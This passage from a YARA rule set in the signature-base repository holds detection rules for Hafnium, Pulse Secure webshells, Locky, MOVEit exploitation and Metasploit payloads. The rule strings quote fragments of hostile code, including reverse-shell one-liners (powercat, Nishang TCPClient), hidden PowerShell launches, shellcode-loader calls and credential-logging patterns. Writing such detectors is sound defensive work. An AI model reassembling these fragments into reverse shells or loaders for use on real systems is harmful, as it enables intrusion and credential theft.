		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_hafnium.yar#L35-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "eb86595956092506c2e29373faaf39a3987f9feed36a53b191bedd498db05cbb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "lsass.exe C:\\windows\\temp\\lsass" ascii wide fullword
		$s2 = "c:\\ProgramData\\it.zip" ascii wide fullword
		$s3 = "powercat.ps1'); powercat -c" ascii wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Nishang_PS1_Invoke_Powershelltcponeline
{
	meta:
		description = "Detects PowerShell Oneliner in Nishang's repository"
		author = "Florian Roth (Nextron Systems)"
		id = "0218ebbd-2dbe-5838-ab53-1e78e3f97b9e"
		date = "2021-03-03"
		modified = "2023-12-05"
		reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_hafnium.yar#L105-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "59622bff95de1077d26ee4547f37cd1045c0c1fc6817df40ff2564b33a962a07"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"

	strings:
		$s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
		$s2 = ".GetStream();[byte[]]$" ascii wide
		$s3 = "New-Object Net.Sockets.TCPClient('" ascii wide

	condition:
		all of them
}

rule SIGNATURE_BASE_FE_Trojan_SH_ATRIUM_1
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "c49441f4-a138-534c-a858-a7462ed865c9"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L29-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a631b7a8a11e6df3fccb21f4d34dbd8a"
		logic_hash = "672a293660d89d5d7d62a658c360bad0b6408611d8794744b17a81e6a75ceea7"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s1 = "CGI::param("
		$s2 = "Cache-Control: no-cache"
		$s3 = "system("
		$s4 = /sed -i [^\r\n]{1,128}CGI::param\([^\r\n]{1,128}print[\x20\x09]{1,32}[^\r\n]{1,128}Cache-Control: no-cache[^\r\n]{1,128}print[\x20\x09]{1,32}[^\r\n]{1,128}Content-type: text\/html[^\r\n]{1,128}my [^\r\n]{1,128}=[\x09\x20]{0,32}CGI::param\([^\r\n]{1,128}system\(/

	condition:
		all of them
}

rule SIGNATURE_BASE_FE_APT_Webshell_PL_PULSECHECK_1
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "f375fdd8-567b-569b-85f4-af54a35d2a93"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L116-L136"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1"
		logic_hash = "aba457dd33232ef37ca145c5b7cd9c5fe809730339a55c5e90ac46b4a136f6cb"
		score = 75
		quality = 60
		tags = ""

	strings:
		$r1 = /while[\x09\x20]{0,32}\(<\w{1,64}>\)[\x09\x20]{0,32}\{\s{1,256}\$\w{1,64}[\x09\x20]{0,32}\.=[\x09\x20]{0,32}\$_;\s{0,256}\}/
		$s1 = "use Crypt::RC4;"
		$s2 = "use MIME::Base64"
		$s3 = "MIME::Base64::decode("
		$s4 = "popen("
		$s5 = " .= $_;"
		$s6 = "print MIME::Base64::encode(RC4("
		$s7 = "HTTP_X_"

	condition:
		$s1 and $s2 and ( @s3 [ 1 ] < @s4 [ 1 ] ) and ( @s4 [ 1 ] < @s5 [ 1 ] ) and ( @s5 [ 1 ] < @s6 [ 1 ] ) and ( #s7 > 2 ) and $r1
}

rule SIGNATURE_BASE_FE_APT_Trojan_PL_PULSEJUMP_1
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "690cc347-e60f-5cac-b65d-367ecee69251"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L137-L153"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "91ee23ee24e100ba4a943bb4c15adb4c"
		logic_hash = "c9aa2b9ef8aff14c20ed6597b1a71eafc3e3c181aabf9a3a68df18945207ff86"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "open("
		$s2 = ">>/tmp/"
		$s3 = "syswrite("
		$s4 = /\}[\x09\x20]{0,32}elsif[\x09\x20]{0,32}\([\x09\x20]{0,32}\$\w{1,64}[\x09\x20]{1,32}eq[\x09\x20]{1,32}[\x22\x27](Radius|Samba|AD)[\x22\x27][\x09\x20]{0,32}\)\s{0,128}\{\s{0,128}@\w{1,64}[\x09\x20]{0,32}=[\x09\x20]{0,32}&/

	condition:
		all of them
}

rule SIGNATURE_BASE_FE_APT_Trojan_PL_RADIALPULSE_1
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "1fab6d2f-96e8-5def-a93e-2bddd04e7ec8"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L173-L190"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b"
		logic_hash = "d65a466cc15214d8e26597588c039a6b9fb4637ef8f3b1ebea27f016fbd5cba8"
		score = 75
		quality = 58
		tags = ""

	strings:
		$s1 = "->getRealmInfo()->{name}"
		$s2 = /open\(\*fd,[\x09\x20]{0,32}[\x22\x27]>>/
		$s3 = /syswrite\(\*fd,[\x09\x20]{0,32}[\x22\x27]realm=\$/
		$s4 = /syswrite\(\*fd,[\x09\x20]{0,32}[\x22\x27]username=\$/
		$s5 = /syswrite\(\*fd,[\x09\x20]{0,32}[\x22\x27]password=\$/

	condition:
		(@s1 [ 1 ] < @s2 [ 1 ] ) and ( @s2 [ 1 ] < @s3 [ 1 ] ) and $s4 and $s5
}

rule SIGNATURE_BASE_FE_APT_Trojan_PL_RADIALPULSE_2
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "dc941935-aec7-54b6-a278-f1453b9785df"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L191-L208"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4a2a7cbc1c8855199a27a7a7b51d0117"
		logic_hash = "4ade993176c918ec23e99fc585e9ab14d9f9e93a7eca00f2c3b0ebbd13d6ec5b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "open(*fd,"
		$s2 = "syswrite(*fd,"
		$s3 = "close(*fd);"
		$s4 = /open\(\*fd,[\x09\x20]{0,32}[\x22\x27]>>\/tmp\/[\w.]{1,128}[\x22\x27]\);[\x09\x20]{0,32}syswrite\(\*fd,[\x09\x20]{0,32}/
		$s5 = /syswrite\(\*fd,[\x09\x20]{0,32}[\x22\x27][\w]{1,128}=\$\w{1,128} ?[\x22\x27],[\x09\x20]{0,32}5000\)/

	condition:
		all of them
}

rule SIGNATURE_BASE_FE_APT_Trojan_PL_RADIALPULSE_3
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "8a597521-c873-5bcc-85e6-5a0a061fffb7"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L209-L226"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4a2a7cbc1c8855199a27a7a7b51d0117"
		logic_hash = "025308591e058de284f949fd4f788e4a4f46bb2f6c0e1161237f1f811d8179ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "open(*fd,"
		$s2 = "syswrite(*fd,"
		$s3 = "close(*fd);"
		$s4 = /open\(\*fd,[\x09\x20]{0,32}[\x22\x27]>>\/tmp\/dsstartssh\.statementcounters[\x22\x27]\);[\x09\x20]{0,32}syswrite\(\*fd,[\x09\x20]{0,32}/
		$s5 = /syswrite\(\*fd,[\x09\x20]{0,32}[\x22\x27][\w]{1,128}=\$username ?[\x22\x27],[\x09\x20]{0,32}\d{4}\)/

	condition:
		all of them
}

rule SIGNATURE_BASE_FE_APT_Webshell_PL_STEADYPULSE_1
{
	meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "49457fbb-9288-565f-909d-e8228c21c1e4"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_pulsesecure.yar#L265-L284"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc"
		logic_hash = "a0e3ebdd02ccf5cc8fc0a83c1d0224aed45dc5094eb85bd855e5b74b34e3aaaf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "parse_parameters"
		$s2 = "s/\\+/ /g"
		$s3 = "s/%(..)/pack("
		$s4 = "MIME::Base64::encode($"
		$s5 = "$|=1;"
		$s6 = "RC4("
		$s7 = "$FORM{'cmd'}"

	condition:
		all of them
}

rule SIGNATURE_BASE_Locky_Ransomware
{
	meta:
		description = "Detects Locky Ransomware (matches also on Win32/Kuluoz)"
		author = "Florian Roth (Nextron Systems) (with the help of binar.ly)"
		id = "ce61e01e-a9ce-54f4-bd2d-8acf1d5fbc30"
		date = "2016-02-17"
		modified = "2023-12-05"
		reference = "https://goo.gl/qScSrE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_locky.yar#L8-L21"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5e945c1d27c9ad77a2b63ae10af46aee7d29a6a43605a9bfbf35cebbcff184d8"
		logic_hash = "c7584ea39c4aceedeb0ea2952be6ff212461674175855274f1783eef80ffba86"
		score = 75
		quality = 85
		tags = ""

	strings:
		$o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 }
		$o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 }

	condition:
		all of ( $o* )
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_1
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "a7c521b8-c654-51dd-9d5b-4ba883feffe3"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/vuln_moveit_0day_jun23.yar#L43-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "26674d8dea5cb2e95e442c4c75d80ca610f7373f0b216c0b1c83a5b1f9f70316"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
		$x2 = " GET /human2.aspx - 443 " ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_2
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "1527f5e3-071d-5152-9452-9c4472d258f2"
		date = "2023-06-03"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/vuln_moveit_0day_jun23.yar#L58-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "56328d078801a702ad47f01f356df6f00be8da593d03c549e77312af9b47b5be"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
		$a2 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36" ascii
		$s1 = " POST /moveitisapi/moveitisapi.dll" ascii
		$s2 = " POST /guestaccess.aspx"
		$s3 = " POST /api/v1/folders/"
		$s4 = "/files uploadType=resumable&"
		$s5 = " action=m2 "

	condition:
		1 of ( $a* ) and 3 of ( $s* ) or all of ( $s* )
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_3
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit DMZ Web API logs"
		author = "Nasreddine Bencherchali"
		id = "113a501f-d9ed-51fd-82cd-ccb6f02833bd"
		date = "2023-06-13"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/vuln_moveit_0day_jun23.yar#L81-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2eaa06c31687c6368f036a705fdc1b1c42355f19c098ae764a998039cc4aebb5"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "TargetInvocationException" ascii
		$s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_Casper_EXE_Dropper
{
	meta:
		description = "Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo"
		author = "Florian Roth (Nextron Systems)"
		id = "a901d045-6f9b-57e8-8347-6f78178b7231"
		date = "2015-03-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/VRJNLo"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_casper.yar#L37-L58"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e4cc35792a48123e71a2c7b6aa904006343a157a"
		logic_hash = "8ffba5598078fdadf2d9e8ee7fe0fef8b3b89517490a379d46cab33cd0036d6e"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<Command>" fullword ascii
		$s1 = "</Command>" fullword ascii
		$s2 = "\" /d \"" fullword ascii
		$s4 = "'%s' %s" fullword ascii
		$s5 = "nKERNEL32.DLL" fullword wide
		$s6 = "@ReturnValue" fullword wide
		$s7 = "ID: 0x%x" fullword ascii
		$s8 = "Name: %S" fullword ascii

	condition:
		7 of them
}

rule SIGNATURE_BASE_Casper_Systeminformation_Output
{
	meta:
		description = "Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo"
		author = "Florian Roth (Nextron Systems)"
		id = "aaae200c-7ef1-52eb-be5b-36e0ad29ecef"
		date = "2015-03-06"
		modified = "2023-12-05"
		reference = "http://goo.gl/VRJNLo"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_casper.yar#L85-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "83c6216bc3e7fadfe81b9bbaca7b14e3398e972f8298c99a8eb576a40e4b4e1b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$a0 = "***** SYSTEM INFORMATION ******"
		$a1 = "***** SECURITY INFORMATION ******"
		$a2 = "Antivirus: "
		$a3 = "Firewall: "
		$a4 = "***** EXECUTION CONTEXT ******"
		$a5 = "Identity: "
		$a6 = "<CONFIG TIMESTAMP="

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_2
{
	meta:
		description = "Metasploit Payloads - file msf.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ec1ae1b6-18a3-5590-ae15-1e2b362c545a"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L25-L40"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8f803a5d71a084e1ea453638bdeaa2dd590a1912be652b74b065d9afd332ffa2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "e52f98466b92ee9629d564453af6f27bd3645e00a9e2da518f5a64a33ccf8eb5"

	strings:
		$s1 = "& \"\\\" & \"svchost.exe\"" fullword ascii
		$s2 = "CreateObject(\"Wscript.Shell\")" fullword ascii
		$s3 = "<% @language=\"VBScript\" %>" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_Psh
{
	meta:
		description = "Metasploit Payloads - file msf-psh.vba"
		author = "Florian Roth (Nextron Systems)"
		id = "5b760f03-b0f8-5871-bd34-e7e44443530c"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L42-L57"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2e6015e8c91ccd8647e78220d10c2d704867369d962b734bb4522a1213be2f2d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "5cc6c7f1aa75df8979be4a16e36cece40340c6e192ce527771bdd6463253e46f"

	strings:
		$s1 = "powershell.exe -nop -w hidden -e" ascii
		$s2 = "Call Shell(" ascii
		$s3 = "Sub Workbook_Open()" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_Exe
{
	meta:
		description = "Metasploit Payloads - file msf-exe.vba"
		author = "Florian Roth (Nextron Systems)"
		id = "fd07240e-0ee0-5318-a436-d97054e92414"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L59-L77"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3baa242e90dd845e022785101ebc2d5c0d84007d20aef6a2bb6a9a8c6280d4eb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "321537007ea5052a43ffa46a6976075cee6a4902af0c98b9fd711b9f572c20fd"

	strings:
		$s1 = "'* PAYLOAD DATA" fullword ascii
		$s2 = " = Shell(" ascii
		$s3 = "= Environ(\"USERPROFILE\")" fullword ascii
		$s4 = "'**************************************************************" fullword ascii
		$s5 = "ChDir (" ascii
		$s6 = "'* MACRO CODE" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_3
{
	meta:
		description = "Metasploit Payloads - file msf.psh"
		author = "Florian Roth (Nextron Systems)"
		id = "ad09167f-a12a-5f07-940b-df679fa8e6c0"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L79-L102"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d1aeb97c19365f996dc1bc0fd6e01342878967be25d3e042158eba986af28b4a"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "335cfb85e11e7fb20cddc87e743b9e777dc4ab4e18a39c2a2da1aa61efdbd054"

	strings:
		$s1 = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(" ascii
		$s2 = "public enum MemoryProtection { ExecuteReadWrite = 0x40 }" fullword ascii
		$s3 = ".func]::VirtualAlloc(0,"
		$s4 = ".func+AllocationType]::Reserve -bOr [" ascii
		$s5 = "New-Object System.CodeDom.Compiler.CompilerParameters" fullword ascii
		$s6 = "ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" fullword ascii
		$s7 = "public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }" fullword ascii
		$s8 = ".func]::CreateThread(0,0,$" fullword ascii
		$s9 = "public enum Time : uint { Infinite = 0xFFFFFFFF }" fullword ascii
		$s10 = "= [System.Convert]::FromBase64String(\"/" ascii
		$s11 = "{ $global:result = 3; return }" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_4
{
	meta:
		description = "Metasploit Payloads - file msf.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "00d7681b-6041-5fe1-adbb-8b7c40df0193"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L104-L121"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8e84ef13aa72c7c35520b3534b908c7d00240915ab02f8216a2cef6440c322a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "26b3e572ba1574164b76c6d5213ab02e4170168ae2bcd2f477f246d37dbe84ef"

	strings:
		$s1 = "= VirtualAlloc(IntPtr.Zero,(UIntPtr)" ascii
		$s2 = ".Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);" ascii
		$s3 = "[System.Runtime.InteropServices.DllImport(\"kernel32\")]" fullword ascii
		$s4 = "private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;" fullword ascii
		$s5 = "private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_Exe_2
{
	meta:
		description = "Metasploit Payloads - file msf-exe.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "a55a33e1-8f04-5417-af0c-b7e2da36fb46"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L123-L139"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bd82f496ade1a62e0aee8c8c90cee84377cb90adf11c87652082e74c8c85e568"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "3a2f7a654c1100e64d8d3b4cd39165fba3b101bbcce6dd0f70dae863da338401"

	strings:
		$x1 = "= new System.Diagnostics.Process();" fullword ascii
		$x2 = ".StartInfo.UseShellExecute = true;" fullword ascii
		$x3 = ", \"svchost.exe\");" ascii
		$s4 = " = Path.GetTempPath();" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_5
{
	meta:
		description = "Metasploit Payloads - file msf.msi"
		author = "Florian Roth (Nextron Systems)"
		id = "030d1982-c9a8-539d-a995-7901ae425857"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L141-L156"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cb602670329391b091f87818a0f5defaa8f688f7921978510739b96ca63a2f12"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "7a6c66dfc998bf5838993e40026e1f400acd018bde8d4c01ef2e2e8fba507065"

	strings:
		$s1 = "required to install Foobar 1.0." fullword ascii
		$s2 = "Copyright 2009 The Apache Software Foundation." fullword wide
		$s3 = "{50F36D89-59A8-4A40-9689-8792029113AC}" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_6
{
	meta:
		description = "Metasploit Payloads - file msf.vbs"
		author = "Florian Roth (Nextron Systems)"
		id = "5485102b-e709-5111-814a-e6878b4bd889"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L158-L177"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b9498828a55477049922e50329d0c38ee34b8484562113a2686669ccbb8b3318"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "8d6f55c6715c4a2023087c3d0d7abfa21e31a629393e4dc179d31bb25b166b3f"

	strings:
		$s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
		$s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s3 = ".GetSpecialFolder(2)" ascii
		$s4 = ".Write Chr(CLng(\"" ascii
		$s5 = "= \"4d5a90000300000004000000ffff00" ascii
		$s6 = "For i = 1 to Len(" ascii
		$s7 = ") Step 2" ascii

	condition:
		5 of them
}

rule SIGNATURE_BASE_Msfpayloads_Msf_7
{
	meta:
		description = "Metasploit Payloads - file msf.vba"
		author = "Florian Roth (Nextron Systems)"
		id = "8d1b742e-510a-5807-ad3f-f10cc325d292"
		date = "2017-02-09"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_metasploit_payloads.yar#L179-L194"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "167d295de5ffc9c88cf72f086fef4514f08cc3b9dd2d93b3ec36acffd6430370"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "425beff61a01e2f60773be3fcb74bdfc7c66099fe40b9209745029b3c19b5f2f"

	strings:
